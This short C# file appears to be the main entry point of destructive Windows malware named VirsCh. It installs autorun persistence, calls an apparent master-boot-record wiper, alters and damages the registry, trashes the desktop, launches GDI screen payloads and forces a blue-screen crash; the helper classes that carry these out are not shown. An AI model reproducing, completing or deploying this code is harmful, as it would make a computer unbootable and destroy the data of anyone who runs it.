using System.Threading;

namespace VirsCh
{
    static class Program
    {
        static void Main()
        {
            if (!Addition.IsInstalledAR())
                Addition.InstallAR();
            Killer.MBR();
            Addition.RegFun();
            var rule = new Rules();
            rule.ShowDialog();
            new Thread(() => Addition.TrashDestop()).Start();
            new Thread(() => Effect.GDI_payloads()).Start();
            Killer.RegFuck();
            Killer.BSOD();
        }
    }
}
